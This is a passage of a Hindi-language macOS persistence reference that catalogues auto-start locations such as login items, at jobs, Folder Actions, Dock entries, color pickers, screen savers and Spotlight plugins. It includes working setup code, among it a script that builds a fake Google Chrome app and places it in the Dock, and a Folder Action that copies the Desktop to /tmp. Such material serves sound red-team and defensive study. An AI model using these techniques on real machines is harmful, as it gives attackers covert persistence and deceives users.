  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Bundled launch plist के लिए, `BundleProgram` को app bundle root के सापेक्ष resolve करें (उदाहरण के लिए `Contents/MacOS/Helper`), जैसा कि [Apple की Service Management migration guidance](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) में बताया गया है। Research Mac पर केवल-पढ़ने योग्य `/Applications` inventory में 14 bundled helper entries और पाँच `BundleProgram` declarations मिलीं; सभी पाँच targets resolve हुए, और दो user-writability check में पास हुए। यह check यह साबित **नहीं** करता कि इनमें से कोई helper registered या enabled है, signature validation के बाद executable है, या sandbox से पहुँच योग्य है। इस Mac पर `sfltool dumpbtm` ने 150 नाम वाले records सूचीबद्ध किए; यह निरीक्षण में सहायता करता है, लेकिन यह जाँच नहीं है कि हर record चल रहा है।

पुराने login items को Apple events के ज़रिए भी manage किया जा सकता है। उन्हें command line से सूचीबद्ध करना, जोड़ना और हटाना संभव है, हालाँकि उन्हें जोड़ने से उपयोगकर्ता का persistent login configuration बदलता है और Automation approval की आवश्यकता हो सकती है:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` एक implementation detail है, फ़ाइल लिखकर payload इंस्टॉल करने की समर्थित जगह नहीं। पुराने `SMLoginItemSetEnabled` API की जगह नए helpers के लिए `SMAppService` का उपयोग किया जाता है; पेज में पहले दिया गया `/var/db/com.apple.xpc.launchd/loginitems.501.plist` path, macOS 26.5.2 test machine पर मौजूद नहीं था। आधुनिक login items का आकलन करते समय किसी अनुमानित database path के बजाय registration API और system UI state का उपयोग करें।

### ZIP को Login Item के रूप में

(Login Items के बारे में पिछला section देखें; यह उसका विस्तार है)

अगर आप किसी **ZIP** फ़ाइल को **Login Item** के रूप में रखते हैं, तो **`Archive Utility`** उसे खोलेगा। अगर ZIP को, उदाहरण के लिए, **`~/Library`** में रखा गया हो और उसमें backdoor वाला **`LaunchAgents/file.plist`** फ़ोल्डर हो, तो वह फ़ोल्डर बन जाएगा (यह डिफ़ॉल्ट रूप से मौजूद नहीं होता) और plist उसमें जोड़ दी जाएगी। इस तरह, अगली बार जब उपयोगकर्ता फिर से लॉग इन करेगा, तो **plist में बताया गया backdoor execute होगा**।

दूसरा विकल्प उपयोगकर्ता के HOME में **`.bash_profile`** और **`.zshenv`** फ़ाइलें बनाना होगा। इस तरह, अगर LaunchAgents फ़ोल्डर पहले से मौजूद है, तब भी यह तकनीक काम करेगी।

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको **`at`** को **execute** करना होगा और यह **enabled** होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`at`** को **execute** करना होगा और यह **enabled** होना चाहिए

#### **विवरण**

`at` tasks को तय समय पर **एक बार चलने वाले tasks शेड्यूल करने** के लिए बनाया गया है। cron jobs के विपरीत, `at` tasks चलने के बाद अपने-आप हटा दिए जाते हैं। यह ध्यान रखना ज़रूरी है कि ये tasks system reboot के बाद भी बने रहते हैं, जिससे कुछ स्थितियों में वे सुरक्षा जोखिम पैदा कर सकते हैं।<sup>[[16]](#references)</sup>

Bundled `com.apple.atrun.plist` में `Disabled = true` है, लेकिन launchd प्रभावी enabled/disabled overrides को अलग से रखता है। macOS 26.5.2 test machine पर, `launchctl print-disabled system` ने `com.apple.atrun` को **enabled** बताया, जबकि bundled key में ऐसा नहीं था। यह दावा करने से पहले कि `at` jobs चलेंगी, प्रभावी state जाँचें:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

एक administrator `launchctl` से disabled `atrun` service को enable कर सकता है; नीचे दिया गया ऐतिहासिक उदाहरण system service की स्थिति बदलता है और इसे research Mac पर **नहीं** चलाया गया था:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

यह 1 घंटे में एक फ़ाइल बनाएगा:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

`atq:` का उपयोग करके job queue की जाँच करें:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

ऊपर हम दो निर्धारित jobs देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके job का विवरण प्रिंट कर सकते हैं।

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> अगर AT tasks enabled नहीं हैं, तो बनाए गए tasks execute नहीं होंगे।

**job files** `/private/var/at/jobs/` में मिलेंगी।

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

फ़ाइलनाम में queue, job number और उसके चलने का निर्धारित समय शामिल होता है। उदाहरण के लिए, `a0001a019bdcd2` को देखते हैं।

- `a` - यह queue है
- `0001a` - hex में job number, `0x1a = 26`
- `019bdcd2` - hex में समय। यह epoch से गुज़रे मिनटों को दर्शाता है। `0x019bdcd2` दशमलव में `26991826` है। इसे 60 से गुणा करने पर `1619509560` मिलता है, जो `GMT: 2021. April 27., Tuesday 7:46:00` है।

अगर हम job फ़ाइल प्रिंट करें, तो पाते हैं कि इसमें वही जानकारी है जो हमें `at -c` का उपयोग करके मिली थी।

### Calendar के open-file अलर्ट

- **लिखने का लक्ष्य:** एक executable app bundle या कोई दूसरी फ़ाइल, जिसे Calendar event के custom **Open file** अलर्ट में **पहले से चुना गया हो**। अलर्ट बनाने या संपादित करने के लिए Calendar या किसी स्वीकृत calendar data source के ज़रिए उस calendar event तक पहुँच चाहिए; किसी random फ़ाइल पर लिखने से अलर्ट नहीं बनता।
- **ट्रिगर:** उस Mac पर अलर्ट का निर्धारित समय, जहाँ Calendar event को प्रोसेस करता है। recurring event इस कार्रवाई को दोहरा सकता है। [Apple की मौजूदा Calendar guide](https://support.apple.com/guide/calendar/icl1012/mac) macOS 26 पर **Custom → Open file** अलर्ट विकल्प की पुष्टि करती है।
- **निष्पादन पहचान और शर्तें:** Calendar चुनी हुई फ़ाइल को signed-in user के लिए उससे संबद्ध application के ज़रिए खोलता है। App bundle लॉन्च करने से उसका code उस user के रूप में चल सकता है, बशर्ते Gatekeeper, quarantine और macOS की अन्य जाँचें इसकी अनुमति दें। कोई plain script फ़ाइल केवल editor में खुल सकती है; केवल उसका extension code execution साबित नहीं करता।

किसी संभावित विकल्प का सुरक्षित आकलन करने के लिए Calendar में event का अलर्ट और चुनी गई फ़ाइल की permissions जाँचें। यह तरीका Apple की guide के आधार पर दर्ज किया गया था और इसे research Mac पर **नहीं** चलाया गया, क्योंकि ऐसा करने से live calendar में बदलाव होता और desktop event का इंतज़ार करना पड़ता। किसी disposable account में marker-only app bundle चुनकर, निकट भविष्य के लिए Open file अलर्ट सेट करके, launch की पुष्टि करके और बाद में event तथा app को हटाकर इसका परीक्षण किया जा सकता है।

### macOS पर Shortcuts automations

- **लिखने का लक्ष्य:** कोई executable फ़ाइल, जिसका shortcut की action में **पहले से संदर्भ दिया गया हो**, या कोई मौजूदा shortcut जिसे अधिकृत user संपादित कर सकता हो। कोई random `.shortcut` फ़ाइल या undocumented Shortcuts database में लिखना automation रजिस्टर करने का समर्थित तरीका नहीं है।
- **ट्रिगर और पहचान:** पहले से कॉन्फ़िगर और सक्षम automation event, जैसे दिन का कोई समय या app event, signed-in user के लिए shortcut चलाता है। [Apple की मौजूदा Mac automation guide](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) समर्थित events की सूची देती है, बताती है कि automation कब बिना पूछे चल सकता है और trigger हटाने का तरीका समझाती है। [Apple की Shortcuts privacy guide](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) के अनुसार script actions के लिए **Allow Running Scripts** आवश्यक है, और अलग-अलग actions फिर भी permissions माँग सकती हैं।

यह write-to-execution का सशर्त रास्ता है, **केवल तभी जब मौजूदा action किसी writable target को लोड करता हो**। UI के ज़रिए नया automation बनाने से live settings बदलती हैं, इसलिए research Mac पर ऐसा करने का प्रयास नहीं किया गया। Disposable account में owner ऐसा time-of-day shortcut कॉन्फ़िगर कर सकता है जिसकी script `/tmp/ht-shortcuts-marker` को छूती हो, ज़रूरी permissions सक्षम कर सकता है, event के बाद marker की पुष्टि कर सकता है और फिर automation, shortcut तथा marker हटा सकता है।

### Automator actions और Quick Actions

- **लिखने के लक्ष्य:** action bundles के लिए `~/Library/Automator/*.action` (user) और `/Library/Automator/*.action` (administrator)। सेव किया गया Quick Action workflow आम तौर पर `~/Library/Services/*.workflow` में रखा जाता है; user द्वारा चुना गया वास्तविक workflow path जाँचें। [Apple का Automator framework reference](https://developer.apple.com/documentation/automator) action search directories की सूची देता है।
- **ट्रिगर:** Automator चलने पर उपलब्ध action bundles लोड करता है, लेकिन किसी action का task तब चलता है जब उसका उपयोग करने वाला workflow execute होता है। Quick Action तब चलता है जब user उसे Finder, Services या किसी अन्य दिखाई देने वाले menu से चुनता है। Folder Action workflow तब चलता है जब items उसके **पहले से जुड़े** folder में जोड़े जाते हैं, और Calendar Alarm workflow अपने event के समय चलता है। [Apple के workflow types](https://support.apple.com/guide/automator/aut7cac58839/mac) इन events में अंतर बताते हैं। केवल action या workflow लिखने से folder attach नहीं होता या calendar event schedule नहीं होता।
- **निष्पादन पहचान और शर्तें:** वह account जो workflow चला रहा है; Automator या उसे बुलाने वाले app को action लोड करना होगा और code-signing या privacy की मौजूदा जाँचों को इसकी अनुमति देनी होगी। किसी active workflow में पहले से संदर्भित writable action bundle का मामला, नया action install करके उसके चुने जाने का इंतज़ार करने से अलग है।

macOS 26.5.2 test Mac पर user की `Automator` और `Services` directories मौजूद थीं; `/Library/Automator` मौजूद नहीं था। कोई live workflow बनाया, attach या execute नहीं किया गया। किसी खास load path की पुष्टि करने के लिए disposable account और marker-only action/workflow का उपयोग करें। अलग [Folder Actions](#folder-actions) section में उस event source के बारे में अधिक जानकारी दी गई है।

### Folder Actions

लेख: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
लेख: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Folder Actions कॉन्फ़िगर करने के लिए **`System Events`** से संपर्क करने हेतु arguments के साथ `osascript` चलाने में सक्षम होना ज़रूरी है
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - इसे Desktop, Documents और Downloads जैसी कुछ बुनियादी TCC permissions मिलती हैं

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
  - Root आवश्यक है
  - **ट्रिगर**: निर्दिष्ट folder तक पहुँच
- **`~/Library/Scripts/Folder Action Scripts`**
  - **ट्रिगर**: निर्दिष्ट folder तक पहुँच

#### विवरण और Exploitation

Folder Actions ऐसी scripts हैं जो किसी folder में बदलाव होने पर अपने-आप ट्रिगर होती हैं, जैसे items जोड़ना या हटाना, अथवा folder window खोलना या उसका आकार बदलना। इन actions का उपयोग विभिन्न कार्यों के लिए किया जा सकता है, और इन्हें Finder UI या terminal commands जैसे अलग-अलग तरीकों से ट्रिगर किया जा सकता है।<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions सेट अप करने के लिए, आपके पास ये विकल्प हैं:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) से Folder Action workflow बनाना और उसे service के रूप में install करना।
2. किसी folder के context menu में Folder Actions Setup के ज़रिए script को मैन्युअल रूप से attach करना।
3. प्रोग्राम के ज़रिए Folder Action सेट अप करने के लिए `System Events.app` को Apple Event messages भेजने हेतु OSAScript का उपयोग करना।
   - यह तरीका action को system में embed करने के लिए खास तौर पर उपयोगी है, जिससे persistence मिलती है।

नीचे दी गई script इसका उदाहरण है कि Folder Action क्या execute कर सकता है:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

ऊपर दी गई script को Folder Actions के साथ उपयोग करने योग्य बनाने के लिए, इसे compile करें:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Script के compile हो जाने के बाद, नीचे दी गई script चलाकर Folder Actions सेट अप करें। यह script Folder Actions को globally enable करेगी और पहले से compile की गई script को विशेष रूप से Desktop folder से attach करेगी।

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

सेटअप script को इस कमांड से चलाएँ:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUI के माध्यम से इस persistence को लागू करने का तरीका यह है:

यह वह script है जिसे execute किया जाएगा:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

इसे इस कमांड से compile करें: `osacompile -l JavaScript -o folder.scpt source.js`

इसे यहां ले जाएं:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

फिर, `Folder Actions Setup` ऐप खोलें, **वह फ़ोल्डर चुनें जिसे आप watch करना चाहते हैं** और अपने मामले में **`folder.scpt`** चुनें (मेरे मामले में मैंने इसका नाम output2.scp रखा था):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, अगर आप उस फ़ोल्डर को **Finder** से खोलेंगे, तो आपकी script execute हो जाएगी।

यह configuration **plist** में base64 format में store की गई थी, जो **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में स्थित है।

अब, आइए GUI access के बिना इस persistence को तैयार करने की कोशिश करें:

1. Backup के लिए **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist` को** `/tmp` में **copy करें**:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. अभी-अभी सेट किए गए Folder Actions को **हटाएँ**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

अब जबकि हमारा environment खाली है

3. Backup file copy करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस config को consume करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> यह मेरे लिए काम नहीं किया, लेकिन writeup में दिए गए निर्देश यही हैं:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको system के अंदर एक malicious application install करनी होगी
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: जब user Dock के अंदर app पर click करता है

#### Description & Exploitation

Dock में दिखाई देने वाले सभी applications plist के अंदर specified होते हैं: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

सिर्फ़ यह करके **एक application जोड़ना** संभव है:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

कुछ **social engineering** का इस्तेमाल करके, आप dock में उदाहरण के लिए Google Chrome का रूप धारण कर सकते हैं और वास्तव में अपनी script चला सकते हैं:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### इनपुट मेथड

- **लिखने का लक्ष्य:** `~/Library/Input Methods/` (उपयोगकर्ता) या `/Library/Input Methods/` (प्रशासक) में इंस्टॉल किया गया ऐसा इनपुट-मेथड ऐप बंडल जिसमें कोड हो। यह Apple की सादे टेक्स्ट वाली `.inputplugin` कीबोर्ड-मैपिंग फ़ाइलों से अलग है, जो अपने आप में मनमाना-कोड पेलोड नहीं होतीं।
- **ट्रिगर:** उपयोगकर्ता **सिस्टम सेटिंग्स → कीबोर्ड → टेक्स्ट इनपुट** में इनपुट स्रोत जोड़ता/सक्षम करता है, फिर उसे चुनता या इस्तेमाल करता है। केवल डायरेक्टरी में कॉपी किया गया बंडल इस बात का प्रमाण नहीं है कि macOS उसे लॉन्च करेगा। [Apple की मौजूदा Input Sources गाइड](https://support.apple.com/guide/mac-help/mchl84525d76/mac) स्रोतों को सक्षम करने और उनके बीच स्विच करने का वर्णन करती है; [Apple का InputMethodKit दस्तावेज़ीकरण](https://developer.apple.com/documentation/inputmethodkit) ऐसे इनपुट मेथड को कवर करता है जिनमें कोड होता है।
- **निष्पादन पहचान और जाँच:** यह मेथड साइन-इन किए हुए उपयोगकर्ता के रूप में चलता है, और इनपुट-मेथड पंजीकरण, कोड-साइनिंग तथा macOS की मौजूदा सुरक्षा जाँचों के अधीन होता है। पहले से सक्षम ऐसे मेथड जिनके executable में लिखने की अनुमति हो, उनके लिए अलग पथ और सिग्नेचर समीक्षा आवश्यक है।

Apple के [पुराने third-party input-method नोट](https://developer.apple.com/library/archive/qa/qa1810/_index.html) में पहले ही चेतावनी दी गई थी कि कुछ palette मेथड को इन डायरेक्टरियों में कॉपी करने से वे Input Sources में दिखाई तक नहीं देते। macOS 26.5.2 वाले शोध Mac पर, उपयोगकर्ता डायरेक्टरी मौजूद है, लेकिन कोई बंडल इंस्टॉल या सक्रिय नहीं था; इसलिए यह स्थानीय रनटाइम परिणाम के बजाय दस्तावेज़ित सशर्त पथ है।

### रंग चयनकर्ता

लेख: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- sandbox को बायपास करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - एक बहुत विशिष्ट कार्रवाई होनी आवश्यक है
  - अंत में आप किसी दूसरे sandbox में होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/Library/ColorPickers`
  - root आवश्यक
  - ट्रिगर: रंग चयनकर्ता का उपयोग करें
- `~/Library/ColorPickers`
  - ट्रिगर: रंग चयनकर्ता का उपयोग करें

#### विवरण और exploit

अपने कोड के साथ **एक रंग चयनकर्ता बंडल कंपाइल करें** (उदाहरण के लिए आप [**यह वाला इस्तेमाल कर सकते हैं**](https://github.com/viktorstrate/color-picker-plus)), एक constructor जोड़ें ([Screen Saver सेक्शन](macos-auto-start-locations.md#screen-saver) की तरह) और बंडल को `~/Library/ColorPickers` में कॉपी करें।<sup>[[20]](#references)</sup>

फिर, रंग चयनकर्ता ट्रिगर होने पर आपका बंडल भी निष्पादित होना चाहिए।

यह इस बात पर निर्भर करता है कि कोई संगत ऐप सिस्टम color panel खोलकर इंस्टॉल किए गए चयनकर्ता को चुने। [Apple की color-panel गाइड](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) पुराने बंडल स्थानों का वर्णन करती है। स्थानीय पथ जाँच में पुराने color-picker XPC service का पता चला, लेकिन शोध Mac पर कोई चयनकर्ता इंस्टॉल या लोड नहीं था; केवल पथ के आधार पर TCC bypass का निष्कर्ष न निकालें।

ध्यान दें कि आपकी लाइब्रेरी लोड करने वाले binary का **sandbox बहुत प्रतिबंधात्मक है**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**लेख**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**लेख**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: **नहीं, क्योंकि आपको अपना ऐप चलाना होगा**
- TCC bypass: सक्षम extension के sandbox और permissions पर निर्भर करता है; कोई सामान्य bypass स्थापित नहीं है।

#### स्थान

- एक विशिष्ट ऐप

#### विवरण और Exploit

Finder Sync Extension वाले ऐप का एक उदाहरण [**यहाँ पाया जा सकता है**](https://github.com/D00MFist/InSync)।

ऐप में `Finder Sync Extensions` हो सकते हैं। यह extension उस ऐप के अंदर मौजूद होगा जिसे चलाया जाएगा। इसके अलावा, extension को अपना code चलाने के लिए किसी मान्य Apple developer certificate से **signed** होना **ज़रूरी** है, इसे **sandboxed** होना चाहिए (हालाँकि इसमें ढील देने वाले exceptions जोड़े जा सकते हैं), और इसे इस तरह की किसी चीज़ से register किया जाना चाहिए:<sup>[[21]](#references)[[22]](#references)</sup>

इंस्टॉल किए गए extension को किसी प्रासंगिक Finder location या item के लिए **enabled** और invoked भी होना चाहिए; मनमाने ढंग से `.appex` bundle लिखना पर्याप्त नहीं है। [Apple का Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) enabled state उपलब्ध कराता है। नीचे दिए गए `pluginkit` commands स्पष्ट registration और enabling दिखाते हैं, न कि केवल file के आधार पर auto-start। इस तरीके की documentation की समीक्षा की गई थी; research Mac पर कोई नया extension इंस्टॉल या enable नहीं किया गया।

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- sandbox को bypass करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आप एक सामान्य application sandbox में पहुँच जाएँगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/System/Library/Screen Savers`
  - Root आवश्यक है
  - **Trigger**: Screen Saver चुनें
- `/Library/Screen Savers`
  - Root आवश्यक है
  - **Trigger**: Screen Saver चुनें
- `~/Library/Screen Savers`
  - **Trigger**: Screen Saver चुनें

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और Exploit

Xcode में एक नया project बनाएँ और नया **Screen Saver** बनाने के लिए template चुनें। फिर उसमें अपना code जोड़ें, उदाहरण के लिए logs बनाने के लिए नीचे दिया गया code।<sup>[[23]](#references)[[24]](#references)</sup>

इसे **Build** करें और `.saver` bundle को **`~/Library/Screen Savers`** में copy करें। फिर Screen Saver GUI खोलें और उस पर click करें; इससे बहुत सारे logs बनने चाहिए:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> ध्यान दें कि इस कोड को लोड करने वाले binary (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) के entitlements में **`com.apple.security.app-sandbox`** मौजूद है, इसलिए आप **सामान्य application sandbox के अंदर** होंगे।

Saver कोड:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आप एक application sandbox में होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - sandbox बहुत सीमित लगता है

#### Location

- `~/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा प्रबंधित extension वाली नई file बनाई जाती है।
- `/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा प्रबंधित extension वाली नई file बनाई जाती है।
  - Root आवश्यक है
- `/System/Library/Spotlight/`
  - **Trigger**: Spotlight plugin द्वारा प्रबंधित extension वाली नई file बनाई जाती है।
